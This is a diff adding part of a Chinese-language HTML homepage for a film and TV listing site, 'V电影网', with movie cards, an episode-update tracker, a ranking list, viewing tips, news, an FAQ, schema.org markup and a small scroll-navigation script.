+      <a class="vcard" href="#">
+        <span class="ph g3"><span class="mk">已看完</span><span class="sc">8.8</span></span>
+        <div class="bd"><h3>第七道弯</h3><div class="meta">2023 · 公路 / 剧情 · 104 分钟</div>
+        <p>一条盘山公路，把父子俩的话慢慢绕出来。适合周末看。</p>
+        <div class="ln"><span>公路</span><span>V-03</span></div></div>
+      </a>
+      <a class="vcard" href="#">
+        <span class="ph g4"><span class="mk">更新中</span><span class="sc">9.0</span></span>
+        <div class="bd"><h3>河谷旅店</h3><div class="meta">2025 · 悬疑 / 群像 · 122 分钟</div>
+        <p>暴雪封山，八个人困在旅店里，各说各的版本。</p>
+        <div class="ln"><span>悬疑</span><span>V-04</span></div></div>
+      </a>
+      <a class="vcard" href="#">
+        <span class="ph g5"><span class="mk">想看</span><span class="sc">8.7</span></span>
+        <div class="bd"><h3>等高线上的信</h3><div class="meta">2024 · 爱情 / 文艺 · 100 分钟</div>
+        <p>两张地图、一叠信，把两个人隔着的距离量了出来。</p>
+        <div class="ln"><span>文艺</span><span>V-05</span></div></div>
+      </a>
+      <a class="vcard" href="#">
+        <span class="ph g6"><span class="mk">已看完</span><span class="sc">8.6</span></span>
+        <div class="bd"><h3>山那头的灯</h3><div class="meta">2022 · 家庭 / 温情 · 108 分钟</div>
+        <p>守山老人的一盏灯，照亮了回村的每一条路。</p>
+        <div class="ln"><span>家庭</span><span>V-06</span></div></div>
+      </a>
+      <a class="vcard" href="#">
+        <span class="ph g7"><span class="mk">轻松</span><span class="sc">8.5</span></span>
+        <div class="bd"><h3>测绘队日常</h3><div class="meta">2023 · 喜剧 / 职场 · 98 分钟</div>
+        <p>一支总在迷路的队伍，把荒野走成了笑话。节奏轻快。</p>
+        <div class="ln"><span>喜剧</span><span>V-07</span></div></div>
+      </a>
+      <a class="vcard" href="#">
+        <span class="ph g8"><span class="mk">经典</span><span class="sc">8.9</span></span>
+        <div class="bd"><h3>老峡谷</h3><div class="meta">1998 · 经典 / 西部 · 126 分钟</div>
+        <p>修复版重录完成，可顺着年代一路看下来。</p>
+        <div class="ln"><span>经典</span><span>V-08</span></div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 海拔阶梯追踪 -->
+  <section class="sec wrap" id="track" aria-labelledby="track-title">
+    <div class="shead">
+      <span class="badge v3"><b>叁</b></span>
+      <span><h2 id="track-title">剧集更新追踪</h2><span class="en">UPDATE TRACK</span></span>
+      <a class="more" href="#">加入追踪列表 →</a>
+    </div>
+    <div class="steps">
+      <div class="step st1 done">
+        <span class="alt"><b>820</b><span>m</span></span>
+        <div class="bd"><h3>《河谷旅店》更新至第 9 集</h3>
+        <p>悬疑群像剧 · 已播 9 / 12 集 · 每周三、四播出</p>
+        <div class="bar"><i style="width:75%"></i></div></div>
+        <span class="go">已更新</span>
+      </div>
+      <div class="step st2 done">
+        <span class="alt"><b>640</b><span>m</span></span>
+        <div class="bd"><h3>《西脊未命名》发布正式预告</h3>
+        <p>纪录剧集 · 档期与看点已记入片库条目，附关联作品</p>
+        <div class="bar"><i style="width:62%"></i></div></div>
+        <span class="go">已更新</span>
+      </div>
+      <div class="step st3">
+        <span class="alt"><b>480</b><span>m</span></span>
+        <div class="bd"><h3>片库上新：26 部影片</h3>
+        <p>涵盖剧情、悬疑、纪录与文艺四类，附建议观影顺序</p>
+        <div class="bar"><i style="width:88%"></i></div></div>
+        <span class="go">进行中</span>
+      </div>
+      <div class="step st4">
+        <span class="alt"><b>320</b><span>m</span></span>
+        <div class="bd"><h3>「山系专题」成册</h3>
+        <p>按时长与节奏分组，附观影顺序建议</p>
+        <div class="bar"><i style="width:56%"></i></div></div>
+        <span class="go">进行中</span>
+      </div>
+      <div class="step st5">
+        <span class="alt"><b>240</b><span>m</span></span>
+        <div class="bd"><h3>经典修复单元开栏</h3>
+        <p>《老峡谷》等经典片目重录完成，条目与评分已恢复</p>
+        <div class="bar"><i style="width:44%"></i></div></div>
+        <span class="go">进行中</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- V 形柱榜 + 指南 -->
+  <section class="sec wrap" id="rank" aria-labelledby="rank-title">
+    <div class="shead">
+      <span class="badge v5"><b>肆</b></span>
+      <span><h2 id="rank-title">观影榜单与选片笔记</h2><span class="en">RANK &amp; NOTES</span></span>
+      <a class="more" href="#">完整榜单 →</a>
+    </div>
+    <div class="vrank">
+      <div class="vbox">
+        <div class="vbars" aria-hidden="true">
+          <span style="height:100%"><b>9.1</b></span>
+          <span style="height:88%"><b>9.0</b></span>
+          <span style="height:76%"><b>8.9</b></span>
+          <span style="height:52%"><b>8.7</b></span>
+          <span style="height:70%"><b>8.8</b></span>
+          <span style="height:84%"><b>8.9</b></span>
+          <span style="height:100%"><b>9.1</b></span>
+        </div>
+        <div class="vrow"><span class="no">01</span><span class="nm"><b>谷底的回声</b><span>剧情 / 悬疑 · 2025</span></span><span class="sc">9.1</span></div>
+        <div class="vrow"><span class="no">02</span><span class="nm"><b>河谷旅店</b><span>悬疑 / 群像 · 2025</span></span><span class="sc">9.0</span></div>
+        <div class="vrow"><span class="no">03</span><span class="nm"><b>西脊未命名</b><span>纪录 / 自然 · 2024</span></span><span class="sc">8.9</span></div>
+        <div class="vrow"><span class="no">04</span><span class="nm"><b>老峡谷</b><span>经典 / 西部 · 1998</span></span><span class="sc">8.9</span></div>
+        <div class="vrow"><span class="no">05</span><span class="nm"><b>第七道弯</b><span>公路 / 剧情 · 2023</span></span><span class="sc">8.8</span></div>
+        <div class="vrow"><span class="no">06</span><span class="nm"><b>等高线上的信</b><span>爱情 / 文艺 · 2024</span></span><span class="sc">8.7</span></div>
+        <div class="vrow"><span class="no">07</span><span class="nm"><b>山那头的灯</b><span>家庭 / 温情 · 2022</span></span><span class="sc">8.6</span></div>
+      </div>
+      <div class="guide">
+        <div class="gd">
+          <h4>笔记 01 · 片单卡上的小标</h4>
+          <p>每张片单卡左上角都贴着一枚小标：今日头条是当日头条，想看是还没看的，已看完是翻过一遍的。小标只说明记到哪一格，不代表优劣。</p>
+        </div>
+        <div class="gd">
+          <h4>笔记 02 · 追踪卡里的进度条</h4>
+          <p>更新追踪卡上的细条就是进度：条子越满，说明追得越靠后或资料越完整。想从头补一部剧，就挑条子短的那一档。</p>
+        </div>
+        <div class="gd">
+          <h4>笔记 03 · 追剧总怕断更</h4>
+          <p>把在追的剧集加入更新追踪，按播出日分组，播出节奏直接登在追踪卡上，看完自己在心里打个勾即可。</p>
+        </div>
+        <div class="gd">
+          <h4>笔记 04 · 一次看不完怎么办</h4>
+          <p>条目页标注分钟数与节奏，超过两小时的片子建议留到周末；通勤或睡前优先选纪录短片与单集剧集。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 资讯 -->
+  <section class="sec wrap" id="news" aria-labelledby="news-title">
+    <div class="shead">
+      <span class="badge v6"><b>伍</b></span>
+      <span><h2 id="news-title">最新影视资讯</h2><span class="en">NEWS</span></span>
+      <a class="more" href="#">资讯中心 →</a>
+    </div>
+    <div class="news">
+      <article class="ncard">
+        <span class="ph g1"></span>
+        <div class="bd"><h3>《谷底的回声》定档秋季</h3>
+        <p>新作公布最终档期与幕后花絮，V电影网同步整理全片看点与关联作品，并给出建议观影顺序。</p>
+        <div class="ft"><time datetime="2026-10-02">2026-10-02 · 本站讯</time></div></div>
+      </article>
+      <article class="ncard">
+        <span class="ph g2"></span>
+        <div class="bd"><h3>本周片库上新 26 部</h3>
+        <p>涵盖剧情、悬疑、纪录与文艺四类，已补录评分与建议观影顺序。</p>
+        <div class="ft"><time datetime="2026-10-01">2026-10-01 · 本站讯</time></div></div>
+      </article>
+      <article class="ncard">
+        <span class="ph g3"></span>
+        <div class="bd"><h3>经典修复单元开栏</h3>
+        <p>按年代与地区重录经典片目，《老峡谷》等作品已恢复条目与评分。</p>
+        <div class="ft"><time datetime="2026-09-28">2026-09-28 · 本站讯</time></div></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 关于 + FAQ -->
+  <section class="sec wrap" id="about" aria-labelledby="about-title">
+    <div class="shead">
+      <span class="badge v4"><b>陆</b></span>
+      <span><h2 id="about-title">关于V电影网</h2><span class="en">ABOUT &amp; FAQ</span></span>
+      <a class="more" href="#">站点介绍 →</a>
+    </div>
+    <div class="ag">
+      <div class="about">
+        <h2>V电影网是什么</h2>
+        <p>V电影网（vdianyingwang-cn.github.io）是一个影视信息聚合与观影导航站点：收录剧情、悬疑、纪录、动画与剧集片单，配剧集更新追踪、观影榜单与选片笔记，打开就能挑一部，不必在多个页面之间来回跳转。</p>
+        <p>全站采用移动端优先的自适应布局，手机、平板与桌面端体验一致；类型等高线、片单、更新追踪与观影榜单四条动线相互打通，片源播放以页面实际提供的来源为准。</p>
+        <p class="note">提示：本站仅提供影视信息聚合与观影导航，片目均为公开影视作品，请通过正规授权渠道观看。</p>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>V电影网的内容多久更新？</summary>
+          <div class="ans">电影片单每日上新，剧集更新追踪按播出日刷新，观影榜单每日重排一次，重要档期与首播节点即时登出。</div>
+        </details>
+        <details>
+          <summary>V电影网收录哪些类型的影视？</summary>
+          <div class="ans">覆盖剧情、悬疑、纪录、动画、爱情、喜剧、科幻、动作、文艺、国产剧、日韩剧与经典佳片共 12 类，可按类型等高线直接进对应分区。</div>
+        </details>
+        <details>
+          <summary>追踪卡里的进度条有什么用？</summary>
+          <div class="ans">更新追踪卡上的细条就是进度：条子越满，说明追得越靠后或资料越完整。想从头补一部剧，就挑条子短的那一档。</div>
+        </details>
+        <details>
+          <summary>找不到想看的影片怎么办？</summary>
+          <div class="ans">可用顶部检索框按片名或类型检索，也可在类型等高线中挑选分区；仍无结果时可提交片名反馈，我们会尽快补录。</div>
+        </details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="grid4">
+      <div>
+        <div class="fb"><em>V</em>电影网</div>
+        <p class="fd">V电影网 · 影视片单与观影导航。本站仅提供影视信息聚合与观影导航服务。</p>
+      </div>
+      <div><h4>版面导览</h4><a href="#">封面</a><a href="#">类型等高线</a><a href="#">电影片单</a><a href="#">更新追踪</a><a href="#">观影榜单</a></div>
+      <div><h4>热门类型</h4><a href="#">剧情片</a><a href="#">悬疑片</a><a href="#">纪录片</a><a href="#">国产剧</a><a href="#">经典佳片</a></div>
+      <div><h4>本站服务</h4><a href="#">站点介绍</a><a href="#">收录规则</a><a href="#">意见反馈</a><a href="#">友情链接</a><a href="#">版面索引</a></div>
+    </div>
+    <div class="copy">
+      <span>Copyright © 2026 V电影网 vdianyingwang-cn.github.io 版权所有</span>
+      <span>关键词：V电影网 · 影视片单 · 剧集更新追踪 · 观影榜单</span>
+    </div>
+  </div>
+</footer>
+
+<nav class="tabbar" aria-label="移动端导航">
+  <a href="#" class="on"><i>◈</i>封面</a>
+  <a href="#genre"><i>◎</i>等高线</a>
+  <a href="#film"><i>▤</i>片单</a>
+  <a href="#track"><i>◷</i>追踪</a>
+  <a href="#rank"><i>▲</i>榜单</a>
+</nav>
+<a class="backtop" href="#" aria-label="返回顶部">TOP</a>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://vdianyingwang-cn.github.io/#website",
+      "url":"https://vdianyingwang-cn.github.io/",
+      "name":"V电影网",
+      "alternateName":"v电影网",
+      "description":"V电影网收录剧情、悬疑、纪录、动画与剧集片单，配剧集更新追踪、观影榜单与选片笔记。",
+      "inLanguage":"zh-CN",
+      "publisher":{"@id":"https://vdianyingwang-cn.github.io/#organization"},
+      "potentialAction":{
+        "@type":"SearchAction",
+        "target":"https://vdianyingwang-cn.github.io/search?q={search_term_string}",
+        "query-input":"required name=search_term_string"
+      }
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://vdianyingwang-cn.github.io/#organization",
+      "name":"V电影网",
+      "url":"https://vdianyingwang-cn.github.io/",
+      "logo":"https://vdianyingwang-cn.github.io/favicon.ico"
+    },
+    {
+      "@type":"WebPage",
+      "@id":"https://vdianyingwang-cn.github.io/#webpage",
+      "url":"https://vdianyingwang-cn.github.io/",
+      "name":"V电影网 - 影视片单推荐、剧集更新追踪与观影榜单",
+      "description":"V电影网：剧情、悬疑、纪录与剧集片单，剧集更新追踪与选片笔记。",
+      "isPartOf":{"@id":"https://vdianyingwang-cn.github.io/#website"},
+      "inLanguage":"zh-CN",
+      "breadcrumb":{"@id":"https://vdianyingwang-cn.github.io/#breadcrumb"}
+    },
+    {
+      "@type":"BreadcrumbList",
+      "@id":"https://vdianyingwang-cn.github.io/#breadcrumb",
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"name":"V电影网","item":"https://vdianyingwang-cn.github.io/"},
+        {"@type":"ListItem","position":2,"name":"类型等高线"},
+        {"@type":"ListItem","position":3,"name":"电影片单"},
+        {"@type":"ListItem","position":4,"name":"剧集更新追踪"},
+        {"@type":"ListItem","position":5,"name":"观影榜单与选片笔记"}
+      ]
+    },
+    {
+      "@type":"ItemList",
+      "name":"V电影网观影榜单",
+      "itemListOrder":"https://schema.org/ItemListOrderDescending",
+      "numberOfItems":5,
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"item":{"@type":"Movie","name":"谷底的回声","genre":"剧情","datePublished":"2025"}},
+        {"@type":"ListItem","position":2,"item":{"@type":"Movie","name":"河谷旅店","genre":"悬疑","datePublished":"2025"}},
+        {"@type":"ListItem","position":3,"item":{"@type":"Movie","name":"西脊未命名","genre":"纪录","datePublished":"2024"}},
+        {"@type":"ListItem","position":4,"item":{"@type":"Movie","name":"老峡谷","genre":"经典","datePublished":"1998"}},
+        {"@type":"ListItem","position":5,"item":{"@type":"Movie","name":"第七道弯","genre":"剧情","datePublished":"2023"}}
+      ]
+    },
+    {
+      "@type":"FAQPage",
+      "mainEntity":[
+        {"@type":"Question","name":"V电影网的内容多久更新？","acceptedAnswer":{"@type":"Answer","text":"电影片单每日上新，剧集更新追踪按播出日刷新，观影榜单每日重排一次，重要档期与首播节点即时登出。"}},
+        {"@type":"Question","name":"V电影网收录哪些类型的影视？","acceptedAnswer":{"@type":"Answer","text":"覆盖剧情、悬疑、纪录、动画、爱情、喜剧、科幻、动作、文艺、国产剧、日韩剧与经典佳片共 12 类，可按类型等高线直接进对应分区。"}},
+        {"@type":"Question","name":"追踪卡里的进度条有什么用？","acceptedAnswer":{"@type":"Answer","text":"更新追踪卡上的细条就是进度：条子越满，说明追得越靠后或资料越完整。想从头补一部剧，就挑条子短的那一档。"}}
+      ]
+    }
+  ]
+}
+</script>
+
+<script>
+(function(){
+  var secs=[].slice.call(document.querySelectorAll('section[id]'));
+  var nav=[].slice.call(document.querySelectorAll('.tnav a'));
+  function sync(){
+    var y=window.scrollY+230,cur='';
+    secs.forEach(function(s){ if(s.offsetTop<=y) cur=s.id; });
+    nav.forEach(function(a){
+      var h=a.getAttribute('href')||'';
+      var on=(!cur && h==='#') || (!!cur && h==='#'+cur);
+      a.classList.toggle('on',on);
+    });
+  }
+  window.addEventListener('scroll',sync,{passive:true});
+  sync();
+  [].slice.call(document.querySelectorAll('.tabbar a')).forEach(function(a){
+    a.addEventListener('click',function(e){e.preventDefault();a.blur();});
+  });
+})();
+</script>
+</body>
+</html>
